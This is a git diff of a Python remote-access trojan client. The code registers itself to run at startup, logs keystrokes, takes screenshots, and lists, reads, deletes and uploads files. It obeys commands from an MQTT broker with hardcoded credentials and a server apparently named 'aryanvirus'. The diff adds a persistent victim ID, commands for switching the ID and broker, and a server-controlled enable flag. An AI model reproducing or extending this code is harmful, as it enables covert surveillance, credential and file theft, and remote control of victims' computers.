@@ -1,10 +1,10 @@
 import paho.mqtt.client as mqtt
 import threading
-import socket
-import uuid
 import time
 import pyautogui as pg
+import json
 import keyboard
+import random
 import os
 import subprocess
 import webbrowser
@@ -14,36 +14,12 @@ from pathlib import Path
 import sys
 import traceback
 import winsound
-# Function imports
 import blockInput
-from notepadType import notepad_write,draw_heart,start_random_move,stop_random_move
+from notepadType import notepad_write,start_random_move,stop_random_move
 from prompt import alertPrompt, inputPrompt
 from klogging import start_logging,stop_logging
 from filecontrol import list_folder,read_file,delete_file,create_file,send_file_to_server
 from systemcontrol import display_off,display_on,full_volume,mute_volume ,set_wallpaper_from_url
-
-CA_CERT = """-----BEGIN CERTIFICATE-----
-MIIDjjCCAnagAwIBAgIQAzrx5qcRqaC7KGSxHQn65TANBgkqhkiG9w0BAQsFADBh
-MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3
-d3cuZGlnaWNlcnQuY29tMSAwHgYDVQQDExdEaWdpQ2VydCBHbG9iYWwgUm9vdCBH
-MjAeFw0xMzA4MDExMjAwMDBaFw0zODAxMTUxMjAwMDBaMGExCzAJBgNVBAYTAlVT
-MRUwEwYDVQQKEwxEaWdpQ2VydCBJbmMxGTAXBgNVBAsTEHd3dy5kaWdpY2VydC5j
-b20xIDAeBgNVBAMTF0RpZ2lDZXJ0IEdsb2JhbCBSb290IEcyMIIBIjANBgkqhkiG
-9w0BAQEFAAOCAQ8AMIIBCgKCAQEAuzfNNNx7a8myaJCtSnX/RrohCgiN9RlUyfuI
-2/Ou8jqJkTx65qsGGmvPrC3oXgkkRLpimn7Wo6h+4FR1IAWsULecYxpsMNzaHxmx
-1x7e/dfgy5SDN67sH0NO3Xss0r0upS/kqbitOtSZpLYl6ZtrAGCSYP9PIUkY92eQ
-q2EGnI/yuum06ZIya7XzV+hdG82MHauVBJVJ8zUtluNJbd134/tJS7SsVQepj5Wz
-tCO7TG1F8PapspUwtP1MVYwnSlcUfIKdzXOS0xZKBgyMUNGPHgm+F6HmIcr9g+UQ
-vIOlCsRnKPZzFBQ9RnbDhxSJITRNrw9FDKZJobq7nMWxM4MphQIDAQABo0IwQDAP
-BgNVHRMBAf8EBTADAQH/MA4GA1UdDwEB/wQEAwIBhjAdBgNVHQ4EFgQUTiJUIBiV
-5uNu5g/6+rkS7QYXjzkwDQYJKoZIhvcNAQELBQADggEBAGBnKJRvDkhj6zHd6mcY
-1Yl9PMWLSn/pvtsrF9+wX3N3KjITOYFnQoQj8kVnNeyIv/iPsGEMNKSuIEyExtv4
-NeF22d+mQrvHRAiGfzZ0JFrabA0UWTW98kndth/Jsw1HKj2ZL7tcu7XUIOGZX1NG
-Fdtom/DzMNU+MeKNhJ7jitralj41E6Vf8PlwUHBHQRFXGU7Aj64GxJUTFy8bJZ91
-8rGOmaFvE7FBcf6IKshPECBV1/MUReXgRPTqh5Uykw7+U0b6LJ3/iyK5S9kJRaTe
-pLiaWN0bfVKfjllDiIGknibVb63dDcY3fe0Dkhvld1927jyNxF1WW6LZZm6zNTfl
-MrY=
------END CERTIFICATE-----"""
 
 def resource_path(relative_path):
     # Works for both PyInstaller EXE and dev Python
@@ -56,6 +32,13 @@ pg.FAILSAFE = False
 # Startup setup
 FLAG_FILE = Path(os.getenv('APPDATA')) / "firstrun.flag"
 N_FLAG_FILE = Path(os.getenv('APPDATA')) / "notification.flag"
+ID_FILE = Path(os.getenv('APPDATA')) / "id.txt"
+BROKER_FILE = Path(os.getenv('APPDATA')) / "broker.txt"
+
+FLAG_URL = "https://aryanvirus.onrender.com/flag"
+LOCAL_FLAG_FILE = Path(os.getenv('APPDATA')) / "mqtt_flag.json"
+mqtt_enabled = False
+
 
 def add_to_startup():
     try:
@@ -75,8 +58,6 @@ nFlag = False
 if N_FLAG_FILE.exists():
     nFlag = True    
 
-# Server / MQTT settings
-# serverUrl = "http://localhost:3000"
 serverUrl = "https://aryanvirus.onrender.com"
 BROKER = "n171f1d9.ala.eu-central-1.emqxsl.com"
 PORT = 8883
@@ -86,9 +67,26 @@ PASSWORD = "aryanvishvishalyadav"
 POLL_INTERVAL = 60
 
 # PC identification
-pc_name = socket.gethostname()
-mac = hex(uuid.getnode())
-pc_id = f"{pc_name}_{mac}"
+# pc_name = socket.gethostname()
+# mac = hex(uuid.getnode())
+# pc_id = f"{pc_name}_{mac}"
+
+if ID_FILE.exists():
+    with open(ID_FILE) as f:
+        pc_id = f.read().strip()
+else:
+    pc_id = str(random.randint(10000,99999))
+    with open(ID_FILE,"w") as f:
+        f.write(pc_id)  
+
+if BROKER_FILE.exists():
+    with open(BROKER_FILE) as f:
+        BROKER = f.read().strip()
+else:
+    with open(BROKER_FILE,"w") as f:
+        f.write(BROKER)               
+
+
 
 # MQTT topics
 CONTROL_TOPIC = f"control/{pc_id}"
@@ -97,7 +95,7 @@ BROADCAST_TOPIC = "control/broadcast"
 # Screenshot
 def take_screenshot():
     try:
-        filename = f"{pc_name}_screenshot.jpg"
+        filename = f"{pc_id}_screenshot.jpg"
         screenshotVar = pg.screenshot()
         screenshotVar.save(filename,"JPEG",quality=50)
         with open(filename, "rb") as f:
@@ -163,9 +161,6 @@ def handle_msg(msg):
             safe_thread(os.system, "rundll32.exe user32.dll,LockWorkStation")
         elif msg == "cut":
             safe_thread(pg.press, "backspace")
-        elif msg == "drawheart":
-            resp=draw_heart()
-            client.publish(ACK_TOPIC, f"Draw Heart : {resp}")
         elif msg == "mouseright":
             pg.rightClick()  
         elif msg == "mouseleft":
@@ -212,17 +207,24 @@ def handle_msg(msg):
             text = msg[len("type "):]
             safe_thread(pg.typewrite, text, 0.2)
 
-        elif msg.startswith("notepadtypeheart"):
-            text = msg[len("notepadtypeheart "):]
-            safe_thread(notepad_write, text, True)
-
         elif msg.startswith("notepadtype"):
             text = msg[len("notepadtype "):]
-            safe_thread(notepad_write, text, False)
+            safe_thread(notepad_write, text)
 
         elif msg.startswith("press"):
             key = msg[len("press "):]
             safe_thread(pg.press, key)
+        elif msg.startswith("changeid"):
+            idkey = msg[len("changeid "):]
+            with open(ID_FILE,"w") as f:
+                f.write(idkey)
+            client.publish(ACK_TOPIC, f"Changed Id To :{idkey}")     
+
+        elif msg.startswith("changebroker"):
+            brokerkey = msg[len("changebroker "):]
+            with open(BROKER_FILE,"w") as f:
+                f.write(brokerkey)
+            client.publish(ACK_TOPIC, f"Changed Broker To :{brokerkey}")         
 
         elif msg.startswith("alertprompt"):
             text = msg[len("alertprompt "):]
@@ -401,7 +403,6 @@ def handle_msg(msg):
         print(f"[FATAL ERROR in handle_msg]: {e}")
         traceback.print_exc()
 
-# Send initial trace
 def send_data():
     try:
         client.publish(ACK_TOPIC, f"TRACE : {pc_id}")
@@ -414,14 +415,22 @@ def send_handler():
     threading.Thread(target=send_data).start()
 
 keyboard.add_hotkey("ctrl+shift+q", send_handler)
-keyboard.add_hotkey("ctrl+shift+a+s", stop_random_move)
-# MQTT callbacks
+
+heartbeat_started = False 
+
 def on_connect(client, userdata, flags, rc):
+    global heartbeat_started
     print(f"{pc_id} Connected to MQTT broker, code: {rc}")
-    client.subscribe(CONTROL_TOPIC)
-    client.subscribe(BROADCAST_TOPIC)
-    client.publish(ACK_TOPIC, f"{pc_id} Connected")
-    # requests.get(f"https://aryanvirus.onrender.com/notify?msg={pc_id} : Connected")
+    if rc == 0:
+        client.subscribe(CONTROL_TOPIC, qos=2)
+        client.subscribe(BROADCAST_TOPIC, qos=2)
+        client.publish(ACK_TOPIC, f"{pc_id} Connected")
+
+        if not heartbeat_started:
+            heartbeat_started = True
+            threading.Thread(target=heartbeat_loop, daemon=True).start()
+
+
 
 def on_message(client, userdata, message):
     msg = message.payload.decode()
@@ -444,7 +453,7 @@ def on_disconnect(client, userdata, rc):
     threading.Thread(target=reconnect_loop, daemon=True).start()
 
 
-client = mqtt.Client()
+client = mqtt.Client(client_id=pc_id,clean_session=False)
 client.username_pw_set(USERNAME, PASSWORD)
 client.tls_set()  
 client.tls_insecure_set(False)  
@@ -463,7 +472,6 @@ def heartbeat_loop():
         except Exception as e:
             print(f"Heartbeat error: {e}")
         time.sleep(HEARTBEAT_INTERVAL)
-threading.Thread(target=heartbeat_loop,daemon=True).start()   
 
 max_delay = 60
 initial_delay = 5
@@ -485,8 +493,87 @@ def connect_mqtt_nonblocking():
                 delay = min(delay + 5, 60)
     threading.Thread(target=_connect, daemon=True).start()
 
+def get_flag_from_server():
+    """Fetch the current MQTT flag for this PC from the Node.js server."""
+    try:
+        res = requests.get(f"{FLAG_URL}?pc_id={pc_id}", timeout=5)
+        data = res.json()
+        return data.get("flag", True)
+    except Exception as e:
+        print(f"[FLAG] Error fetching flag: {e}")
+        return None
+
+def set_flag_on_server(state: bool):
+    """Optional: set this PC's flag remotely (if needed)"""
+    try:
+        requests.get(f"{FLAG_URL}?pc_id={pc_id}&state={'true' if state else 'false'}", timeout=5)
+        print(f"[FLAG] Server flag for {pc_id} set to {state}")
+    except Exception as e:
+        print(f"[FLAG] Error setting flag: {e}")
+
+def load_local_flag():
+    """Read local flag fallback."""
+    if LOCAL_FLAG_FILE.exists():
+        try:
+            with open(LOCAL_FLAG_FILE, "r") as f:
+                data = json.load(f)
+                return data.get("flag", True)
+        except Exception as e:
+            print(f"[FLAG] Local flag read error: {e}")
+    return True
+
+def save_local_flag(value: bool):
+    """Persist local flag for offline mode."""
+    try:
+        with open(LOCAL_FLAG_FILE, "w") as f:
+            json.dump({"flag": value}, f)
+    except Exception as e:
+        print(f"[FLAG] Local flag save error: {e}")
+
+if not LOCAL_FLAG_FILE.exists():
+    save_local_flag(True)
+
+
+def flag_monitor():
+    global mqtt_enabled
+    while True:
+        flag = get_flag_from_server()
+        if flag is not None:
+            mqtt_enabled = flag
+            save_local_flag(flag)
+            if flag:
+                print("🌐 Internet available & flag enabled — connecting MQTT.")
+                connect_mqtt_nonblocking()
+                return
+            else:
+                print("Flag disabled on server — skipping MQTT.")
+                return
+        else:
+            print("No internet yet — retrying flag in 60s.")
+            time.sleep(60)
+
+flag = get_flag_from_server()
+
+if flag is None:
+    print("No internet — checking local flag.")
+    flag = load_local_flag()
+    if flag is None:
+        flag = True  # default ON if no info
+
+if not flag:
+    print("Flag disabled by server — stopping script.")
+    save_local_flag(False)
+    sys.exit(0)  # 🛑 stop script completely
+
+# Otherwise, connect
+save_local_flag(True)
+print("Flag enabled — connecting to MQTT now.")
 connect_mqtt_nonblocking()
+
+
+
 client.loop_forever()
+
 
 
 
